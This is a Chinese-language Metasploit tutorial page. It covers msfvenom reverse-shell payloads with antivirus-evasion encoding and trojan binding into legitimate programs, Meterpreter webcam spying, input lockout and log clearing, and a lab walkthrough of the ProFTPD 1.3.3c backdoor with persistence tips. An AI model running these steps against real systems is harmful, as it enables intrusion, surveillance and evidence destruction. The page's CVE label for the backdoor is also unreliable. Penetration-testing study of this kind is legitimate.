---
title: Metasploit 渗透框架入门教程
description: 系统梳理 Metasploit Framework 在 Windows 10 环境下的安装部署、PostgreSQL 数据库配置、msfvenom
  木马生成与编码免杀、监听器配置及会话建立后的基础后渗透操作，并补充 ProFTPd 1.3.3c 后门漏洞利用实战案例，演示 search msf 模块、payload
  选择、会话建立及后渗透提权全流程。
category: program-analysis
tags:
- Metasploit
- 渗透测试
- PostgreSQL
- msfvenom
- 后渗透
- Windows
- 木马生成
- 免杀
- ProFTPd
- CVE-2010-4221
- 提权
date: '2019-12-30'
updated: '2026-11-15'
---

## 概述

Metasploit Framework（简称 MSF）是一个模块化的渗透测试框架，集成了数百个已知漏洞利用模块、载荷、编码器、辅助模块及后渗透功能，号称“渗透测试全家桶”。本文基于 0th3rs 安全团队微信归档文章，整理了在 **Windows 10** 环境下的完整安装配置流程、数据库对接、木马生成与监听、以及会话建立后的常用后渗透操作，并补充 **ProFTPd 1.3.3c 后门漏洞（CVE-2010-4221）实战复现** 全流程，演示从服务枚举、模块检索、载荷选择到会话建立与提权的完整攻击链。

> 💡 相关扩展阅读：[[frp内网渗透应用]] 中演示了如何结合 frp SOCKS5 隧道代理本地 Metasploit 进行内网反弹 Shell；[[proftpd-133c-backdoor-exploitation]] 提供该漏洞的独立详细复现页，含 Exploit-DB 源码分析与 nmap/scripts 搜索细节。

---

## Windows 10 环境安装

### 下载与路径规划
- 官方安装包：`https://windows.metasploit.com/metasploitframework-latest.msi`
- **关键约束**：必须创建一个**空文件夹**作为安装路径，**严禁安装到 `C:\Program Files`** 目录，否则后续 PostgreSQL 服务无法启动。
- 安装完成后将该路径加入系统 `Path` 环境变量（此电脑 → 属性 → 高级系统设置 → 环境变量 → 系统变量 Path → 编辑 → 新建）。

### 杀毒软件白名单
安装过程中杀毒软件会拦截/删除组件，**务必提前将安装目录加入白名单**，否则会出现“一边安装一边被删”的情况。

### 验证安装
打开 Windows Terminal / PowerShell / CMD，执行：
```bash
msfconsole
```
首次启动会显示随机 ASCII 艺术横幅，进入 `msf6 >` 提示符即表示核心程序就绪。

---

## PostgreSQL 数据库配置

Metasploit 依赖 PostgreSQL 存储漏洞库、扫描结果、会话信息等。**最新版仅支持 PostgreSQL**，不再兼容 MySQL 等其他数据库。

### 安装注意事项
- 同理，**不要安装到 `C:\Program Files`**，否则 Windows 安全策略导致服务启动失败。
- 其余步骤默认下一步即可，记录安装时设置的用户名、密码、端口（默认 5432）。

### msfconsole 内连接数据库
```bash
# 查看当前连接状态
db_status

# 连接数据库
db_connect username:password@127.0.0.1:5432

# 保存配置，下次自动连接
db_save
```
连接成功后 `db_status` 将显示 `postgresql connected`。

---

## msfvenom 木马生成与免杀进阶

`msfvenom` 是载荷生成与编码工具，集成了 `msfpayload` 与 `msfencode`。

### 资源查询
```bash
# 列出所有可用载荷
msfvenom -l payloads

# 列出所有可用编码器
msfvenom -l encoders
```

### 基础反向载荷生成（以 Windows x64 为例）
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<攻击机IP> LPORT=<监听端口> \
  -f exe -o shell.exe
```
常用平台载荷对照：

| 目标平台 | 载荷示例 | 输出格式 |
|----------|----------|----------|
| Windows x64 | `windows/x64/meterpreter/reverse_tcp` | `exe` |
| Linux x86 | `linux/x86/meterpreter/reverse_tcp` | `elf` |
| macOS | `osx/x86/shell_reverse_tcp` | `macho` |
| Android | `android/meterpreter/reverse_tcp` | `apk` |

参数速查：
- `-p`：指定载荷
- `-f`：输出文件格式
- `-o`：输出文件路径
- `LHOST` / `LPORT`：攻击机回连地址与端口

### 编码与免杀（PLUS）
```bash
# 多次迭代编码
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<IP> LPORT=<PORT> \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o shell_encoded.exe
```
- `-e`：指定编码器（`shikata_ga_nai` 为多态 XOR 编码器）
- `-i`：迭代次数（次数越大特征码变化越大，但体积增大）

### 程序捆绑
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<IP> LPORT=<PORT> \
  -e x86/shikata_ga_nai -i 5 \
  -x /path/to/legit.exe -f exe -o shell_bundled.exe
```
- `-x`：指定合法程序作为模板，生成的文件保留原程序功能并植入载荷。

### UPX 壳加固（需在 msfconsole 内执行）
```bash
msf6 > upx -5 shell.exe
```
> ⚠️ 以上免杀手法仅供学习研究，**无法对抗主流 EDR/AV**，实战中需结合免杀框架、内存注入、带签名加载器等高级技术。

---

## 监听器配置与会话建立

### 启动多功能处理器
```bash
msf6 > use exploit/multi/handler
```

### 设置载荷与参数
```bash
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set LHOST 192.168.1.100
msf6 exploit(multi/handler) > set LPORT 4444
```
> `payload` 必须与生成木马时一致。

### 启动监听
```bash
msf6 exploit(multi/handler) > run
# 或
msf6 exploit(multi/handler) > exploit -j   # 后台作业模式
```
目标执行木马后，控制台将弹出 `Meterpreter session 1 opened ...`，输入 `sessions -i 1` 进入交互。

---

## 会话后基础后渗透操作（Windows 目标）

建立 Meterpreter 会话后，常用模块如下：

### 摄像头控制
```bash
meterpreter > webcam_list          # 列举摄像头
meterpreter > webcam_snap          # 拍照
meterpreter > webcam_stream -i 1   # 实时视频流（-i 指定设备索引）
```

### 键鼠控制
```bash
meterpreter > uictl disable mouse   # 禁用鼠标
meterpreter > uictl disable keyboard # 禁用键盘
meterpreter > uictl enable all       # 恢复
```

### 系统 Shell 落地
```bash
meterpreter > shell   # 进入目标原生 cmd.exe，输入 exit 返回 meterpreter
```

### 日志清理
```bash
meterpreter > clearev   # 清除应用/系统/安全三大事件日志
```

### 更多模块探索
```bash
meterpreter > help      # 查看完整命令列表
meterpreter > run post/windows/gather/enum_applications  # 示例：枚举已安装软件
```
后渗透模块位于 `post/` 目录下，涵盖信息收集、权限提升、横向移动、持久化等。

---

## 实战案例：ProFTPd 1.3.3c 后门漏洞利用复现（CVE-2010-4221）

本节基于 0w1Club 归档文章《FTP服务后门漏洞利用》复现，演示在 **Kali Linux** 攻击机针对 **Ubuntu** 靶机的完整利用流程，覆盖 **服务枚举 → 漏洞检索 → MSF 模块搜索 → 载荷选择 → 会话建立 → TTY 优化 → 提权验证** 全链路。

> 💡 同类漏洞复现参考：[[vulnhub-doubletrouble-writeup]]（Shellshock + Dirty COW 提权链）、[[vulnhub-admx-new-writeup]]（WordPress 插件上传 → MySQL UDF 提权）、[[internal-network-pivoting-techniques]]（Meterpreter 路由配合横向移动）。

### 环境准备
| 角色 | IP 地址 | 说明 |
|------|---------|------|
| 攻击机 | 172.20.236.105 | Kali Linux，已安装 Metasploit Framework |
| 靶机   | 172.20.207.39  | Ubuntu，运行 ProFTPD 1.3.3c |

### 服务枚举与版本识别
使用 `nmap` 进行服务版本扫描，定位 FTP 服务版本：
```bash
nmap -sV 172.20.207.39
```
扫描结果显示：
```
21/tcp open  ftp     ProFTPD 1.3.3c
```
> 💡 交叉引用：[[network-fundamentals-penetration-testing]] 详解 nmap 服务版本探测原理与参数优化。

### 漏洞情报检索
利用 `searchsploit` 在本地 Exploit-DB 检索对应版本漏洞：
```bash
searchsploit ProFTPD 1.3.3c
```
输出示例：
```
linux/remote/15662.txt   # ProFTPD 1.3.3c - Backdoor Command Execution
```
查看漏洞详情：
```bash
gedit /usr/share/exploitdb/exploits/linux/remote/15662.txt
```
源码中硬编码回连 IP `212.26.42.47`，需修改后编译利用，**但 MSF 已集成该模块，直接使用更高效**。

### MSF 模块搜索与加载
启动 `msfconsole`，搜索对应模块：
```bash
msf6 > search ProFTPd 1.3.3c
```
匹配模块：
```
exploit/unix/ftp/proftpd_133c_backdoor
```
加载模块：
```bash
msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
```

### 载荷选择与配置
查看可用载荷：
```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads
```
推荐使用 **命令反弹载荷**（无需上传二进制，适配 Linux 环境）：
```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload cmd/unix/reverse
```
设置目标与回连参数：
```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show options
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 172.20.207.39
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RPORT 21
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 172.20.236.105
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LPORT 4444
```

### 发起攻击与会话建立
```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run
```
成功输出示例：
```
[*] Command shell session 1 opened (172.20.236.105:4444 -> 172.20.207.39:38214)
```
进入会话：
```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > sessions -i 1
```

### TTY 优化与交互增强
原始 Shell 缺乏补全、历史记录、Ctrl+C 等交互能力，使用 Python 生成伪终端：
```bash
python -c "import pty;pty.spawn('/bin/bash')"
```
> 💡 进阶 TTY 优化技巧（`script /dev/null`、`stty raw -echo`、`export TERM=xterm`）可参考 [[peda-buffer-overflow-analysis-guide]] 中的调试环境配置段落。

### 权限验证与后渗透
执行 `whoami`/`id` 确认权限：
```bash
root@ubuntu:/# whoami
root
```
漏洞利用直接获得 **root 权限**，无需额外提权。后续可开展：
- 敏感文件收集（`/etc/shadow`、SSH 密钥、Web 目录配置）
- 持久化植入（SSH 公钥、定时任务、systemd 服务）
- 内网横向移动（结合 [[internal-network-pivoting-techniques]] 中 Meterpreter `autoroute`/SOCKS 代理）
- 日志清理（`/var/log/auth.log`、`/var/log/wtmp` 等）

> 💡 实战中若仅获取低权限 Shell，可结合 [[linux-kernel-hardening-mechanisms]] 核对内核版本，搜索对应提权漏洞（如 Dirty COW CVE-2016-5195、CVE-2021-3493 等），参考 [[vulnhub-hard-socnet2-writeup]]、[[vulnhub-sar-writeup]] 实战提权链。

---

## 常见问题与避坑指南

| 现象 | 原因 | 解决方案 |
|------|------|----------|
| `msfconsole` 启动极慢 / 报错 | 杀毒软件拦截 Ruby 依赖 | 安装目录加白名单、关闭实时防护重装 |
| `db_connect` 失败 | PostgreSQL 服务未启动 / 端口冲突 | `services.msc` 启动 `postgresql-x64-<ver>`，检查 5432 端口 |
| 生成的 `exe` 秒被删除 | 静态特征码命中 | 使用编码器、捆绑、自定义加载器、内存执行（如 `inject`、`execute -m`） |
| Android 载荷无法回连 | 权限未授予 / 网络不通 | 目标需授予摄像头、联系人、存储权限；确保 LHOST 可达（公网 IP 或内网穿透） |
| `search ProFTPd` 无结果 | 模块名称不精确 | 尝试 `search proftpd`、`search 133c`、`search backdoor` 组合关键词 |
| `cmd/unix/reverse` 会话无交互 | 目标无 Python/Perl 等解释器 | 尝试 `cmd/unix/reverse_perl`、`cmd/unix/reverse_bash` 或上传静态编译的 `busybox`/`socat` |

---

## 交叉引用与延伸学习

- [[frp内网渗透应用]] — 利用 frp SOCKS5 代理 Metasploit 穿透内网
- [[burpsuite-basics-tutorial]] — Web 渗透常用代理工具，配合 MSF 进行漏洞验证
- [[docker-container-security-fundamentals]] — 容器环境下的渗透测试与防御视角
- [[daily-security-digest-20191230]] — 同期每日安全看点，收录 Metasploit DoS 漏洞 (CVE-2019-5645) 等资讯
- [[0th3rs-security-team-wechat-archive-201911-202204]] — 文章来源索引，可追溯更多团队历史技术分享
- [[proftpd-133c-backdoor-exploitation]] — 该漏洞独立详细复现页，含 Exploit-DB 源码分析、nmap 脚本检测、手动编译利用对比
- [[vulnhub-doubletrouble-writeup]] — Shellshock (CVE-2014-6271) + Dirty COW (CVE-2016-5195) 组合提权链
- [[internal-network-pivoting-techniques]] — Meterpreter `autoroute`、`socks_proxy` 配合 Cobalt Strike/Venom/Frp 横向移动体系
- [[peda-buffer-overflow-analysis-guide]] — Linux 下 PEDA 调试、ROP 链构造、TTY 优化技巧
- [[linux-kernel-hardening-mechanisms]] — 内核缓解机制与提权漏洞适用性判断指南

---

## 小结

Metasploit Framework 以模块化、自动化、生态完善著称，是渗透测试从业者的“瑞士军刀”。本文覆盖了 **安装 → 数据库 → 载荷生成 → 监听 → 后渗透** 的基础闭环，并以 **ProFTPd 1.3.3c 后门（CVE-2010-4221）** 为实战案例，演示了 **nmap 枚举 → searchsploit 情报收集 → MSF 模块搜索 → cmd/unix/reverse 载荷选择 → 会话建立 → Python PTY 优化 → root 权限验证** 的完整攻击链。**实战中务必遵守法律法规，仅在授权范围内开展测试**，切勿用于非法入侵。

> “工具无善恶，使用者有初心。” —— 0th3rs 安全团队

---
*页面来源：0th3rs 安全团队微信公众号归档文章《【分享】Metasploit 渗透框架初探》（发布于 2019-12-30）与 0w1Club 归档文章《FTP服务后门漏洞利用》整合*  
*整理日期：2025-08-24*  
*维护者：数字知识库策展人*

## 来源

- [0x00实验室-202108-202304_098](../sources/0x00实验室-202108-202304_098.md)
